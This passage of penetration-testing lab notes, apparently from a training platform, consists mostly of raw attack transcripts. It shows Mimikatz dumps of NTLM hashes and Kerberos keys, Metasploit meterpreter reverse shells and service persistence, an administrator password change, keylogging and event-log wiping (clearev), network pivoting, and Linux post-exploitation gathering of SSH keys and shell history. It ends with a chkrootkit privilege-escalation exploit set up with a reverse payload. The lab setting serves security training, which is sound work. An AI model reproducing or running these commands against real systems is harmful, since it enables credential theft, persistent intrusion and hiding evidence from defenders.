Logon Time        : 2/8/2024 11:45:00 AM
SID               : S-1-5-90-0-3
	msv :	
	tspkg :	
	wdigest :	
	 * Username : ATTACKDEFENSE$
	 * Domain   : WORKGROUP
	 * Password : (null)
	kerberos :	
	ssp :	
	credman :	

Authentication Id : 0 ; 2504411 (00000000:002636db)
Session           : Interactive from 3
User Name         : DWM-3
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 2/8/2024 11:45:00 AM
SID               : S-1-5-90-0-3
	msv :	
	tspkg :	
	wdigest :	
	 * Username : ATTACKDEFENSE$
	 * Domain   : WORKGROUP
	 * Password : (null)
	kerberos :	
	ssp :	
	credman :	

Authentication Id : 0 ; 2502837 (00000000:002630b5)
Session           : Interactive from 3
User Name         : UMFD-3
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 2/8/2024 11:45:00 AM
SID               : S-1-5-96-0-3
	msv :	
	tspkg :	
	wdigest :	
	 * Username : ATTACKDEFENSE$
	 * Domain   : WORKGROUP
	 * Password : (null)
	kerberos :	
	ssp :	
	credman :	

Authentication Id : 0 ; 62205 (00000000:0000f2fd)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 2/8/2024 11:37:19 AM
SID               : S-1-5-90-0-1
	msv :	
	tspkg :	
	wdigest :	
	 * Username : ATTACKDEFENSE$
	 * Domain   : WORKGROUP
	 * Password : (null)
	kerberos :	
	ssp :	
	credman :	

Authentication Id : 0 ; 996 (00000000:000003e4)
Session           : Service from 0
User Name         : ATTACKDEFENSE$
Domain            : WORKGROUP
Logon Server      : (null)
Logon Time        : 2/8/2024 11:37:19 AM
SID               : S-1-5-20
	msv :	
	tspkg :	
	wdigest :	
	 * Username : ATTACKDEFENSE$
	 * Domain   : WORKGROUP
	 * Password : (null)
	kerberos :	
	 * Username : attackdefense$
	 * Domain   : WORKGROUP
	 * Password : (null)
	ssp :	
	credman :	

Authentication Id : 0 ; 33415 (00000000:00008287)
Session           : Interactive from 1
User Name         : UMFD-1
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 2/8/2024 11:37:18 AM
SID               : S-1-5-96-0-1
	msv :	
	tspkg :	
	wdigest :	
	 * Username : ATTACKDEFENSE$
	 * Domain   : WORKGROUP
	 * Password : (null)
	kerberos :	
	ssp :	
	credman :	

Authentication Id : 0 ; 173720 (00000000:0002a698)
Session           : Interactive from 1
User Name         : Administrator
Domain            : ATTACKDEFENSE
Logon Server      : ATTACKDEFENSE
Logon Time        : 2/8/2024 11:37:27 AM
SID               : S-1-5-21-3688751335-3073641799-161370460-500
	msv :	
	 [00000003] Primary
	 * Username : Administrator
	 * Domain   : ATTACKDEFENSE
	 * NTLM     : e3c61a68f1b89ee6c8ba9507378dc88d
	 * SHA1     : fa62275e30d286c09d30d8fece82664eb34323ef
	tspkg :	
	wdigest :	
	 * Username : Administrator
	 * Domain   : ATTACKDEFENSE
	 * Password : (null)
	kerberos :	
	 * Username : Administrator
	 * Domain   : ATTACKDEFENSE
	 * Password : (null)
	ssp :	
	credman :	

Authentication Id : 0 ; 997 (00000000:000003e5)
Session           : Service from 0
User Name         : LOCAL SERVICE
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 2/8/2024 11:37:19 AM
SID               : S-1-5-19
	msv :	
	tspkg :	
	wdigest :	
	 * Username : (null)
	 * Domain   : (null)
	 * Password : (null)
	kerberos :	
	 * Username : (null)
	 * Domain   : (null)
	 * Password : (null)
	ssp :	
	credman :	

Authentication Id : 0 ; 62186 (00000000:0000f2ea)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 2/8/2024 11:37:19 AM
SID               : S-1-5-90-0-1
	msv :	
	tspkg :	
	wdigest :	
	 * Username : ATTACKDEFENSE$
	 * Domain   : WORKGROUP
	 * Password : (null)
	kerberos :	
	ssp :	
	credman :	

Authentication Id : 0 ; 33384 (00000000:00008268)
Session           : Interactive from 0
User Name         : UMFD-0
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 2/8/2024 11:37:18 AM
SID               : S-1-5-96-0-0
	msv :	
	tspkg :	
	wdigest :	
	 * Username : ATTACKDEFENSE$
	 * Domain   : WORKGROUP
	 * Password : (null)
	kerberos :	
	ssp :	
	credman :	

Authentication Id : 0 ; 32302 (00000000:00007e2e)
Session           : UndefinedLogonType from 0
User Name         : (null)
Domain            : (null)
Logon Server      : (null)
Logon Time        : 2/8/2024 11:37:18 AM
SID               :
	msv :	
	tspkg :	
	wdigest :	
	kerberos :	
	ssp :	
	credman :	

Authentication Id : 0 ; 999 (00000000:000003e7)
Session           : UndefinedLogonType from 0
User Name         : ATTACKDEFENSE$
Domain            : WORKGROUP
Logon Server      : (null)
Logon Time        : 2/8/2024 11:37:17 AM
SID               : S-1-5-18
	msv :	
	tspkg :	
	wdigest :	
	 * Username : ATTACKDEFENSE$
	 * Domain   : WORKGROUP
	 * Password : (null)
	kerberos :	
	 * Username : attackdefense$
	 * Domain   : WORKGROUP
	 * Password : (null)
	ssp :	
	credman :	


mimikatz # lsadump::sam
Domain : ATTACKDEFENSE
SysKey : 377af0de68bdc918d22c57a263d38326
Local SID : S-1-5-21-3688751335-3073641799-161370460

SAMKey : 858f5bda5c99e45094a6a1387241a33d

RID  : 000001f4 (500)
User : Administrator
  Hash NTLM: e3c61a68f1b89ee6c8ba9507378dc88d

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : ed1f5e64aad3727f03522bbddc080d77

* Primary:Kerberos-Newer-Keys *
    Default Salt : ATTACKDEFENSEAdministrator
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : f566d48c0c62f88d997e9e56b52eed1696aead09df3100982bcfc5920655da5d
      aes128_hmac       (4096) : bf0ca9e206e82ce481c818070bef0855
      des_cbc_md5       (4096) : 6d570d08df8979fe
    OldCredentials
      aes256_hmac       (4096) : 69d101a02f3f4648bf9875f10c1cd268d3f500c3253ab862222a9e1bb3740247
      aes128_hmac       (4096) : 3c3fd899f7f004ed44e9e48f868a5ddc
      des_cbc_md5       (4096) : 9b808fb9e0cbb3b5
    OlderCredentials
      aes256_hmac       (4096) : 4cbbe8ad8482ca76952b08cd9103ba91af35c9d8b21a3d49c332e072618a9fa9
      aes128_hmac       (4096) : b18addd75f8a2b106b262c7b5e517623
      des_cbc_md5       (4096) : 7fe0c2a15eb32fcd

* Packages *
    NTLM-Strong-NTOWF

* Primary:Kerberos *
    Default Salt : ATTACKDEFENSEAdministrator
    Credentials
      des_cbc_md5       : 6d570d08df8979fe
    OldCredentials
      des_cbc_md5       : 9b808fb9e0cbb3b5


RID  : 000001f5 (501)
User : Guest

RID  : 000001f7 (503)
User : DefaultAccount

RID  : 000001f8 (504)
User : WDAGUtilityAccount
  Hash NTLM: 58f8e0214224aebc2c5f82fb7cb47ca1

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : a1528cd40d99e5dfa9fa0809af998696

* Primary:Kerberos-Newer-Keys *
    Default Salt : WDAGUtilityAccount
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 3ff137e53cac32e3e3857dc89b725fd62ae4eee729c1c5c077e54e5882d8bd55
      aes128_hmac       (4096) : 15ac5054635c97d02c174ee3aa672227
      des_cbc_md5       (4096) : ce9b2cabd55df4ce

* Packages *
    NTLM-Strong-NTOWF

* Primary:Kerberos *
    Default Salt : WDAGUtilityAccount
    Credentials
      des_cbc_md5       : ce9b2cabd55df4ce


RID  : 000003f0 (1008)
User : student
  Hash NTLM: bd4ca1fbe028f3c5066467a7f6a73b0b

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : b8e5edf45f3a42335f1f4906a24a08fe

* Primary:Kerberos-Newer-Keys *
    Default Salt : EC2AMAZ-R69684Tstudent
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : bab064fdaf62216a1577f1d5cd88e162f6962b4a421d199adf4c66b61ec6ac7c
      aes128_hmac       (4096) : 42bc1d17d1236d3afc09efbeba547d2c
      des_cbc_md5       (4096) : 1a975b02a7bf15d5

* Packages *
    NTLM-Strong-NTOWF

* Primary:Kerberos *
    Default Salt : EC2AMAZ-R69684Tstudent
    Credentials
      des_cbc_md5       : 1a975b02a7bf15d5
```

### Windows Persistence

```bash
msf6 exploit(windows/http/rejetto_hfs_exec) > use exploit/windows/local/persistence_service
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/local/persistence_service) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/local/persistence_service) > options

Module options (exploit/windows/local/persistence_service):

   Name                 Current Setting  Required  Description
   ----                 ---------------  --------  -----------
   REMOTE_EXE_NAME                       no        The remote victim name. Random string as default.
   REMOTE_EXE_PATH                       no        The remote victim exe path to run. Use temp directory as default.
   RETRY_TIME           5                no        The retry time that shell connect failed. 5 seconds as default.
   SERVICE_DESCRIPTION                   no        The description of service. Random string as default.
   SERVICE_NAME                          no        The name of service. Random string as default.
   SESSION                               yes       The session to run this module on.


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.10.4.8        yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows

msf6 exploit(windows/local/persistence_service) > set SESSION 1
SESSION => 1
msf6 exploit(windows/local/persistence_service) > run

[*] Started reverse TCP handler on 10.10.4.8:4444
[-] Only support for windows meterpreter/shell reverse staged payload
[*] Exploit completed, but no session was created.
msf6 exploit(windows/local/persistence_service) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf6 exploit(windows/local/persistence_service) > run

[*] Started reverse TCP handler on 10.10.4.8:4444
[*] Running module against WIN-OMCNBKR66MN
[+] Meterpreter service exe written to C:\Users\ADMINI~1\AppData\Local\Temp\1\JmpI.exe
[*] Creating service fobfQuA
[*] Sending stage (175174 bytes) to 10.4.31.235
[*] Cleanup Meterpreter RC File: /root/.msf4/logs/persistence/WIN-OMCNBKR66MN_20240209.3025/WIN-OMCNBKR66MN_20240209.3025.rc
[*] Meterpreter session 2 opened (10.10.4.8:4444 -> 10.4.31.235:49265) at 2024-02-09 18:30:25 +0530

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM

meterpreter > exit
[*] Shutting down Meterpreter...

[*] 10.4.31.235 - Meterpreter session 2 closed.  Reason: User exit
msf6 exploit(windows/local/persistence_service) > sessions

Active sessions
===============

  Id  Name  Type                     Information                                      Connection
  --  ----  ----                     -----------                                      ----------
  1         meterpreter x64/windows  WIN-OMCNBKR66MN\Administrator @ WIN-OMCNBKR66MN  10.10.4.8:4444 -> 10.4.31.235:49238 (10.4.31.235)

msf6 exploit(windows/local/persistence_service) > sessions -K
[*] Killing all sessions...
[*] 10.4.31.235 - Meterpreter session 1 closed.

msf6 exploit(windows/local/persistence_service) > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > options

Module options (exploit/multi/handler):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     eth1             yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target


msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.10.4.8:4444
[*] Sending stage (175174 bytes) to 10.4.31.235
[*] Meterpreter session 3 opened (10.10.4.8:4444 -> 10.4.31.235:49280) at 2024-02-09 18:32:20 +0530

meterpreter > exit
[*] Shutting down Meterpreter...

[*] 10.4.31.235 - Meterpreter session 3 closed.  Reason: User exit
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.10.4.8:4444
[*] Sending stage (175174 bytes) to 10.4.31.235
[*] Meterpreter session 4 opened (10.10.4.8:4444 -> 10.4.31.235:49284) at 2024-02-09 18:33:10 +0530

```
Change user password

```bash
meterpreter > shell
Process 1768 created.
Channel 2 created.
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Windows\system32>net users
net users

User accounts for \\

-------------------------------------------------------------------------------
Administrator            Guest
The command completed with one or more errors.


C:\Windows\system32>net user administrator hacker_123
net user administrator hacker_123
The command completed successfully.
```

Connect to RDP

```bash
oot@attackdefense:~# xfreerdp /u:administrator /p:hacker_123 /v:10.4.27.103
[18:01:51:704] [752:753] [INFO][com.freerdp.client.common.cmdline] - loading channelEx cliprdr
[18:01:51:731] [752:753] [INFO][com.freerdp.crypto] - creating directory /root/.config/freerdp
[18:01:51:731] [752:753] [INFO][com.freerdp.crypto] - creating directory [/root/.config/freerdp/certs]
[18:01:51:731] [752:753] [INFO][com.freerdp.crypto] - created directory [/root/.config/freerdp/server]
[18:01:51:753] [752:753] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[18:01:51:753] [752:753] [ERROR][com.freerdp.crypto] - @           WARNING: CERTIFICATE NAME MISMATCH!           @
[18:01:51:753] [752:753] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[18:01:51:753] [752:753] [ERROR][com.freerdp.crypto] - The hostname used for this connection (10.4.27.103:3389)
[18:01:51:753] [752:753] [ERROR][com.freerdp.crypto] - does not match the name given in the certificate:
[18:01:51:753] [752:753] [ERROR][com.freerdp.crypto] - Common Name (CN):
[18:01:51:753] [752:753] [ERROR][com.freerdp.crypto] - 	WIN-OMCNBKR66MN
[18:01:51:753] [752:753] [ERROR][com.freerdp.crypto] - A valid certificate for the wrong name should NOT be trusted!
Certificate details for 10.4.27.103:3389 (RDP-Server):
	Common Name: WIN-OMCNBKR66MN
	Subject:     CN = WIN-OMCNBKR66MN
	Issuer:      CN = WIN-OMCNBKR66MN
	Thumbprint:  24:4f:d7:ed:a6:b9:bb:f4:d2:77:ae:c5:bd:d9:ff:d9:f8:01:bc:bc
The above X.509 certificate could not be verified, possibly because you do not have
the CA certificate in your certificate store, or the certificate has expired.
Please look at the OpenSSL documentation on how to add a private CA to the store.
Do you trust the above certificate? (Y/T/N)
```

Keylogger

```bash
meterpreter > keyscan_start
Starting the keystroke sniffer ...
meterpreter > keyscan_dump
Dumping captured keystrokes...
some data<CR>
<Shift>Username<Shift>:<Right Shift>Admin<CR>
<Shift>Password<Shift>:<Shift>hacked<Shift>_123
```
Clear Event Logs

```bash
meterpreter > clearev
[*] Wiping 254 records from Application...
[*] Wiping 503 records from System...
[*] Wiping 15901 records from Security...
```

```bash
meterpreter > run autoroute -s 10.4.22.0/20

[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
[!] Example: run post/multi/manage/autoroute OPTION=value [...]
[*] Adding a route to 10.4.22.0/255.255.240.0...
[+] Added route to 10.4.22.0/255.255.240.0 via 10.4.22.121
[*] Use the -p option to list all active routes
```

Port Forward
```bash
meterpreter > portfwd add -l 1234 -p 80 -r 10.4.31.201
[*] Local TCP relay created: :1234 <-> 10.4.31.201:80
```

```bash
$ evil-winrm -i target -u administrator -p badminton

Evil-WinRM shell v3.5

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
```

## Linux Post Exploitation

```bash
msf5 post(multi/manage/shell_to_meterpreter) > use post/linux/gather/enum_configs
msf5 post(linux/gather/enum_configs) > options

Module options (post/linux/gather/enum_configs):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION                   yes       The session to run this module on.

msf5 post(linux/gather/enum_configs) > setg SESSION 2
SESSION => 2
msf5 post(linux/gather/enum_configs) > run

[*] Running module against 192.207.25.3 [victim-1]
[*] Info:
[*]     Debian GNU/Linux 8
[*]     Linux victim-1 5.4.0-152-generic #169-Ubuntu SMP Tue Jun 6 22:23:09 UTC 2023 x86_64 GNU/Linux
[-] Failed to open file: /etc/apache2/apache2.conf: core_channel_open: Operation failed: 1
[-] Failed to open file: /etc/apache2/ports.conf: core_channel_open: Operation failed: 1
[-] Failed to open file: /etc/nginx/nginx.conf: core_channel_open: Operation failed: 1
[-] Failed to open file: /etc/snort/snort.conf: core_channel_open: Operation failed: 1
[-] Failed to open file: /etc/mysql/my.cnf: core_channel_open: Operation failed: 1
[-] Failed to open file: /etc/ufw/ufw.conf: core_channel_open: Operation failed: 1
[-] Failed to open file: /etc/ufw/sysctl.conf: core_channel_open: Operation failed: 1
[-] Failed to open file: /etc/security.access.conf: core_channel_open: Operation failed: 1
[+] shells stored in /root/.msf4/loot/20240212235936_post_192.207.25.3_linux.enum.conf_146046.txt
[+] sepermit.conf stored in /root/.msf4/loot/20240212235936_post_192.207.25.3_linux.enum.conf_836466.txt
[+] ca-certificates.conf stored in /root/.msf4/loot/20240212235936_post_192.207.25.3_linux.enum.conf_535050.txt
[+] access.conf stored in /root/.msf4/loot/20240212235936_post_192.207.25.3_linux.enum.conf_710071.txt
[-] Failed to open file: /etc/gated.conf: core_channel_open: Operation failed: 1
[+] rpc stored in /root/.msf4/loot/20240212235936_post_192.207.25.3_linux.enum.conf_984706.txt
[-] Failed to open file: /etc/psad/psad.conf: core_channel_open: Operation failed: 1
[-] Failed to open file: /etc/mysql/debian.cnf: core_channel_open: Operation failed: 1
[-] Failed to open file: /etc/chkrootkit.conf: core_channel_open: Operation failed: 1
[-] Failed to open file: /etc/logrotate.conf: core_channel_open: Operation failed: 1
[-] Failed to open file: /etc/rkhunter.conf: core_channel_open: Operation failed: 1
[-] Failed to open file: /etc/samba/smb.conf: core_channel_open: Operation failed: 1
[+] ldap.conf stored in /root/.msf4/loot/20240212235936_post_192.207.25.3_linux.enum.conf_360356.txt
[-] Failed to open file: /etc/openldap/openldap.conf: core_channel_open: Operation failed: 1
[-] Failed to open file: /etc/cups/cups.conf: core_channel_open: Operation failed: 1
[-] Failed to open file: /etc/opt/lampp/etc/httpd.conf: core_channel_open: Operation failed: 1
[+] sysctl.conf stored in /root/.msf4/loot/20240212235936_post_192.207.25.3_linux.enum.conf_096232.txt
[-] Failed to open file: /etc/proxychains.conf: core_channel_open: Operation failed: 1
[-] Failed to open file: /etc/cups/snmp.conf: core_channel_open: Operation failed: 1
[-] Failed to open file: /etc/mail/sendmail.conf: core_channel_open: Operation failed: 1
[-] Failed to open file: /etc/snmp/snmp.conf: core_channel_open: Operation failed: 1
[*] Post module execution completed

msf5 post(linux/gather/enum_configs) > use post/multi/gather/env
msf5 post(multi/gather/env) > options

Module options (post/multi/gather/env):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION  2                yes       The session to run this module on.

msf5 post(multi/gather/env) > run

[*] Debian 8.11 (Linux 5.4.0-152-generic)
[*] Post module execution completed

msf5 post(multi/gather/env) > use post/linux/gather/enum_network
msf5 post(linux/gather/enum_network) > options

Module options (post/linux/gather/enum_network):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION  2                yes       The session to run this module on.

msf5 post(linux/gather/enum_network) > run

[*] Running module against 192.207.25.3
[*] Module running as root
[+] Info:
[+]     Debian GNU/Linux 8
[+]     Linux victim-1 5.4.0-152-generic #169-Ubuntu SMP Tue Jun 6 22:23:09 UTC 2023 x86_64 GNU/Linux
[*] Collecting data...
[-] Failed to open file: /etc/ssh/sshd_config: core_channel_open: Operation failed: 1
[-] Unable to get data for Network config
[-] Unable to get data for Route table
[+] Firewall config stored in /root/.msf4/loot/20240213000155_post_192.207.25.3_linux.enum.netwo_199099.txt
[+] DNS config stored in /root/.msf4/loot/20240213000155_post_192.207.25.3_linux.enum.netwo_796912.txt
[-] Unable to get data for SSHD config
[+] Host file stored in /root/.msf4/loot/20240213000155_post_192.207.25.3_linux.enum.netwo_882979.txt
[+] SSH keys stored in /root/.msf4/loot/20240213000156_post_192.207.25.3_linux.enum.netwo_914963.txt
[-] Unable to get data for Active connections
[-] Unable to get data for Wireless information
[-] Unable to get data for Listening ports
[+] If-Up/If-Down stored in /root/.msf4/loot/20240213000156_post_192.207.25.3_linux.enum.netwo_133673.txt
[*] Post module execution completed


msf5 post(linux/gather/enum_network) > use post/linux/gather/enum_protections
msf5 post(linux/gather/enum_protections) > options

Module options (post/linux/gather/enum_protections):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION  2                yes       The session to run this module on.

msf5 post(linux/gather/enum_protections) > run

[*] Running module against 192.207.25.3 [victim-1]
[*] Info:
[*]     Debian GNU/Linux 8
[*]     Linux victim-1 5.4.0-152-generic #169-Ubuntu SMP Tue Jun 6 22:23:09 UTC 2023 x86_64 GNU/Linux
[*] Finding system protections...
[+] ASLR is enabled
[+] SMEP is enabled
[+] SMAP is enabled
[+] Yama is installed and enabled
[*] Finding installed applications...
[+] iptables found: /sbin/iptables
[+] tcpdump found: /usr/sbin/tcpdump
[+] wireshark found: /usr/bin/wireshark
[*] System protections saved to notes.
[*] Post module execution completed


msf5 post(linux/gather/enum_protections) > use post/linux/gather/enum_system
msf5 post(linux/gather/enum_system) > options

Module options (post/linux/gather/enum_system):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION  2                yes       The session to run this module on.

msf5 post(linux/gather/enum_system) > run

[+] Info:
[+]     Debian GNU/Linux 8
[+]     Linux victim-1 5.4.0-152-generic #169-Ubuntu SMP Tue Jun 6 22:23:09 UTC 2023 x86_64 GNU/Linux
[+]     Module running as "root" user
[*] Linux version stored in /root/.msf4/loot/20240213000703_post_192.207.25.3_linux.enum.syste_329214.txt
[*] User accounts stored in /root/.msf4/loot/20240213000703_post_192.207.25.3_linux.enum.syste_013074.txt
[*] Installed Packages stored in /root/.msf4/loot/20240213000703_post_192.207.25.3_linux.enum.syste_379920.txt
[*] Running Services stored in /root/.msf4/loot/20240213000703_post_192.207.25.3_linux.enum.syste_431249.txt
[*] Cron jobs stored in /root/.msf4/loot/20240213000703_post_192.207.25.3_linux.enum.syste_158718.txt
[*] Disk info stored in /root/.msf4/loot/20240213000703_post_192.207.25.3_linux.enum.syste_930647.txt
[*] Logfiles stored in /root/.msf4/loot/20240213000703_post_192.207.25.3_linux.enum.syste_847050.txt
[*] Setuid/setgid files stored in /root/.msf4/loot/20240213000703_post_192.207.25.3_linux.enum.syste_286091.txt
[*] Post module execution completed

msf5 post(linux/gather/enum_system) > use post/linux/gather/checkcontainer
msf5 post(linux/gather/checkcontainer) > options

Module options (post/linux/gather/checkcontainer):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION  2                yes       The session to run this module on.

msf5 post(linux/gather/checkcontainer) > run

[+] This appears to be a 'Docker' container
[*] Post module execution completed


msf5 post(linux/gather/checkcontainer) > use post/linux/gather/checkvm
msf5 post(linux/gather/checkvm) > options

Module options (post/linux/gather/checkvm):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION  2                yes       The session to run this module on.

msf5 post(linux/gather/checkvm) > run

[*] Gathering System info ....
[-] Failed to open file: /proc/scsi/scsi: core_channel_open: Operation failed: 1
[-] Post failed: NoMethodError undefined method `gsub' for nil:NilClass
[-] Call stack:
[-]   /usr/share/metasploit-framework/modules/post/linux/gather/checkvm.rb:74:in `run'
[*] Post module execution completed


msf5 post(linux/gather/checkvm) > use post/linux/gather/enum_users_history
msf5 post(linux/gather/enum_users_history) > options

Module options (post/linux/gather/enum_users_history):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION  2                yes       The session to run this module on.

msf5 post(linux/gather/enum_users_history) > run

[+] Info:
[+]     Debian GNU/Linux 8
[+]     Linux victim-1 5.4.0-152-generic #169-Ubuntu SMP Tue Jun 6 22:23:09 UTC 2023 x86_64 GNU/Linux
[-] Failed to open file: /root/.ash_history: core_channel_open: Operation failed: 1
[+] bash history for root stored in /root/.msf4/loot/20240213001046_post_192.207.25.3_linux.enum.users_853543.txt
[-] Failed to open file: /root/.csh_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /root/.ksh_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /root/.sh_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /root/.tcsh_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /root/.zsh_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /root/.mysql_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /root/.psql_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /root/.dbshell: core_channel_open: Operation failed: 1
[-] Failed to open file: /root/.viminfo: core_channel_open: Operation failed: 1
[-] Failed to open file: /usr/sbin/.ash_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /usr/sbin/.bash_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /usr/sbin/.csh_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /usr/sbin/.ksh_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /usr/sbin/.sh_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /usr/sbin/.tcsh_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /usr/sbin/.zsh_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /usr/sbin/.mysql_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /usr/sbin/.psql_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /usr/sbin/.dbshell: core_channel_open: Operation failed: 1
[-] Failed to open file: /usr/sbin/.viminfo: core_channel_open: Operation failed: 1
[-] Failed to open file: /bin/.ash_history: core_channel_open: Operation failed: 1
```

Connect with SSH

```bash
msf5 > use auxiliary/scanner/ssh/ssh_login
msf5 auxiliary(scanner/ssh/ssh_login) > options

Module options (auxiliary/scanner/ssh/ssh_login):

   Name              Current Setting  Required  Description
   ----              ---------------  --------  -----------
   BLANK_PASSWORDS   false            no        Try blank passwords for all users
   BRUTEFORCE_SPEED  5                yes       How fast to bruteforce, from 0 to 5
   DB_ALL_CREDS      false            no        Try each user/password couple stored in the current database
   DB_ALL_PASS       false            no        Add all passwords in the current database to the list
   DB_ALL_USERS      false            no        Add all users in the current database to the list
   PASSWORD                           no        A specific password to authenticate with
   PASS_FILE                          no        File containing passwords, one per line
   RHOSTS            192.100.135.3    yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT             22               yes       The target port
   STOP_ON_SUCCESS   false            yes       Stop guessing when a credential works for a host
   THREADS           1                yes       The number of concurrent threads (max one per host)
   USERNAME                           no        A specific username to authenticate as
   USERPASS_FILE                      no        File containing users and passwords separated by space, one pair per line
   USER_AS_PASS      false            no        Try the username as the password for all users
   USER_FILE                          no        File containing usernames, one per line
   VERBOSE           false            yes       Whether to print output for all attempts

msf5 auxiliary(scanner/ssh/ssh_login) > set USERNAME jackie
USERNAME => jackie
msf5 auxiliary(scanner/ssh/ssh_login) > set PASSWORD password
PASSWORD => password
msf5 auxiliary(scanner/ssh/ssh_login) > run

[+] 192.100.135.3:22 - Success: 'jackie:password' ''
[*] Command shell session 1 opened (192.100.135.2:33427 -> 192.100.135.3:22) at 2024-02-13 00:18:45 +0000
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf5 auxiliary(scanner/ssh/ssh_login) > sessions

Active sessions
===============

  Id  Name  Type           Information                             Connection
  --  ----  ----           -----------                             ----------
  1         shell unknown  SSH jackie:password (192.100.135.3:22)  192.100.135.2:33427 -> 192.100.135.3:22 (192.100.135.3)

msf5 auxiliary(scanner/ssh/ssh_login) > sessions -u 1
[*] Executing 'post/multi/manage/shell_to_meterpreter' on session(s): [1]

[!] SESSION may not be compatible with this module.
[*] Upgrading session ID: 1
[*] Starting exploit/multi/handler
[*] Started reverse TCP handler on 192.100.135.2:4433
[*] Sending stage (980808 bytes) to 192.100.135.3
[*] Meterpreter session 2 opened (192.100.135.2:4433 -> 192.100.135.3:43332) at 2024-02-13 00:19:12 +0000
[*] Command stager progress: 100.00% (773/773 bytes)
msf5 auxiliary(scanner/ssh/ssh_login) > sessions

Active sessions
===============

  Id  Name  Type                   Information                                                                    Connection
  --  ----  ----                   -----------                                                                    ----------
  1         shell unknown          SSH jackie:password (192.100.135.3:22)                                         192.100.135.2:33427 -> 192.100.135.3:22 (192.100.135.3)
  2         meterpreter x86/linux  no-user @ victim-1 (uid=1000, gid=1000, euid=1000, egid=1000) @ 192.100.135.3  192.100.135.2:4433 -> 192.100.135.3:43332 (192.100.135.3)
```

```bash
msf5 > use exploit/unix/local/chkrootkit
msf5 exploit(unix/local/chkrootkit) > options

Module options (exploit/unix/local/chkrootkit):

   Name        Current Setting                       Required  Description
   ----        ---------------                       --------  -----------
   CHKROOTKIT  /usr/local/bin/chkrootkit/chkrootkit  yes       Path to chkrootkit
   SESSION     1                                     yes       The session to run this module on.


Payload options (cmd/unix/reverse):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.1.0.3         yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic

msf5 exploit(unix/local/chkrootkit) > set LHOST 192.100.135.2
LHOST => 192.100.135.2

msf5 exploit(unix/local/chkrootkit) > run

